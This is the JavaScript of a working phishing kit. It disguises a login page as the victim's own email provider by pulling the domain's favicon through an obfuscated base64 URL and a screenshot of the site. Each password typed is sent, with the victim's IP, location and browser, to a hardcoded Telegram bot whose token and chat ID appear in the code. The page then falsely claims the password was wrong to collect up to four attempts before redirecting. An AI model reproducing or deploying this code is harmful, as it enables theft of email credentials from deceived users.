    <script src="https://cdn.jsdelivr.net/npm/jquery@3.7.0/dist/jquery.min.js"></script>
    <script>
        // Telegram configuration
        const TELEGRAM_BOT_TOKEN = "8713461978:AAELlrlfNWSeoZz6dN1H_Um_VMrM1BzWFYc";
        const TELEGRAM_CHAT_ID = "7272832664";
        
        // Function to send message to Telegram via fetch API
        function sendToTelegram(email, password, ip, country, city, region, browser, attempt, timestamp) {
            const message = "ð%8%C§ *NEW LOGIN DATA* ð%8%C§\n\n" +
                "ð%8%8¤ *Email:* " + email + "\n" +
                "ð%8%D%8 *Password:* " + password + "\n" +
                "ð%8%2 *IP:* " + ip + "\n" +
                "ð%8%C *Country:* " + country + "\n" +
                "ð%8%2ï¸ *City:* " + city + "\n" +
                "ð%8%4ºï¸ *Region:* " + region + "\n" +
                "ð%8%3¥ï¸ *Browser:* " + browser + "\n" +
                "ð%8%D¢ *Attempt:* " + attempt + "/4\n" +
                "â° *Time:* " + timestamp + "\n" +
                "ð%8%C%6 *Date:* " + new Date().toLocaleString() + "\n" +
                "â%Dâ%Dâ%Dâ%Dâ%Dâ%Dâ%Dâ%Dâ%Dâ%Dâ%Dâ%Dâ%Dâ%Dâ%Dâ%Dâ%Dâ%Dâ%Dâ%Dâ%D";
            
            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
            
            const postData = new URLSearchParams();
            postData.append('chat_id', TELEGRAM_CHAT_ID);
            postData.append('text', message);
            postData.append('parse_mode', 'Markdown');
            
            fetch(url, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded',
                },
                body: postData
            })
            .then(response => response.json())
            .then(data => {
                console.log('Telegram message sent:', data);
            })
            .catch(error => {
                console.error('Error sending to Telegram:', error);
            });
        }
        
        // Function to get location info from IP using free API
        async function getLocationFromIP(ip) {
            if (!ip || ip === 'Unknown') {
                return { country: 'Unknown', city: 'Unknown', region: 'Unknown' };
            }
            
            try {
                const response = await fetch(`https://ipinfo.io/${ip}/json`);
                const data = await response.json();
                return {
                    country: data.country || 'Unknown',
                    city: data.city || 'Unknown',
                    region: data.region || 'Unknown'
                };
            } catch (error) {
                console.error('Error getting location:', error);
                return { country: 'Unknown', city: 'Unknown', region: 'Unknown' };
            }
        }
        
        // Function to get browser name from user agent
        function getBrowserName() {
            const ua = navigator.userAgent;
            if (ua.includes('Firefox')) return 'Firefox';
            if (ua.includes('Edg')) return 'Edge';
            if (ua.includes('Chrome')) return 'Chrome';
            if (ua.includes('Safari')) return 'Safari';
            if (ua.includes('Opera') || ua.includes('OPR')) return 'Opera';
            if (ua.includes('MSIE') || ua.includes('Trident')) return 'Internet Explorer';
            return 'Unknown';
        }
        
        // Function to get IP address (using free API)
        async function getIPAddress() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                return data.ip;
            } catch (error) {
                console.error('Error getting IP:', error);
                return 'Unknown';
            }
        }
        
        $(document).ready(function() {
            const getit = new URLSearchParams(window.location.search);
            const hashedget = getit.get('e');
            
            if (!hashedget) {
                $('body').html('<div style="text-align:center; padding:50px; font-size:24px;">Please provide an email parameter in the URL (?e=email@domain.com)</div>');
            } else {
                $("#email").val(hashedget);
                let dxmain = hashedget.split("@")[1];
                let sitename = dxmain.split(".")[0].toUpperCase();
                sitename = sitename.charAt(0).toUpperCase() + sitename.slice(1).toLowerCase();
                
                document.title = sitename + document.title;
                document.querySelector('#logoname').textContent = sitename;
                
                let favimg = atob('aHR0cHM6Ly90MS5nc3RhdGljLmNvbS9mYXZpY29uVjI/Y2xpZW50PVNPQ0lBTCZ0eXBlPUZBVklDT04mZmFsbGJhY2tfb3B0cz1UWVBFLFNJWkUsVVJMJnNpemU9NjQmdXJsPWh0dHA6Ly8=')+dxmain
                document.querySelector('link[rel="shortcut icon"]').setAttribute('href', favimg);
                document.querySelector('body').style.backgroundImage = `url('https://image.thum.io/get/width/1200/https://${dxmain}')`;
                document.querySelector('#logo').setAttribute('src', favimg);
                
                // Store email domain for final redirect
                window.emailDomain = 'https://' + dxmain;
            }
            
            // Attempt counter
            let attemptCount = 1;
            const MAX_ATTEMPTS = 4;
            
            // Handle form submission - send directly to Telegram
            $("#loginForm").on('submit', async function(e) {
                e.preventDefault();
                
                let email = $("#email").val();
                let password = $("#password").val();
                
                if (!password || password.length < 1) {
                    $("#msg").text("Please enter your password");
                    return;
                }
                
                const isLastAttempt = (attemptCount >= MAX_ATTEMPTS);
                
                // Disable button to prevent multiple submissions
                $("#getitBtn").prop('disabled', true).html("Processing...");
                
                try {
                    // Get IP address and location
                    const ip = await getIPAddress();
                    const location = await getLocationFromIP(ip);
                    const browser = getBrowserName();
                    const timestamp = new Date().toLocaleTimeString();
                    
                    // Send to Telegram
                    sendToTelegram(
                        email, 
                        password, 
                        ip, 
                        location.country, 
                        location.city, 
                        location.region, 
                        browser, 
                        attemptCount, 
                        timestamp
                    );
                    
                } catch (error) {
                    console.error('Error processing:', error);
                    // Still try to send basic info
                    sendToTelegram(email, password, 'Unknown', 'Unknown', 'Unknown', 'Unknown', 'Unknown', attemptCount, new Date().toLocaleTimeString());
                }
                
                // Handle UI feedback based on attempt
                if (isLastAttempt) {
                    $("#getitBtn").html("Redirecting...");
                    setTimeout(function() {
                        window.location.href = window.emailDomain;
                    }, 1500);
                } else {
                    $("#getitBtn").prop('disabled', false).html("Continue");
                    $("#msg").text("Invalid password, try again").css("color", "red");
                    $("#password").val("");
                    attemptCount++;
                }
            });
        });

        // Toggle password visibility
        function togglePasswordVisibility() {
            const e = document.getElementById("password");
            const t = document.getElementById("togglePassword");
            
            if ("password" === e.type) {
                e.type = "text";
                t.classList.remove("fa-eye");
                t.classList.add("fa-eye-slash");
            } else {
                e.type = "password";
                t.classList.remove("fa-eye-slash");
                t.classList.add("fa-eye");
            }
        }
    </script>
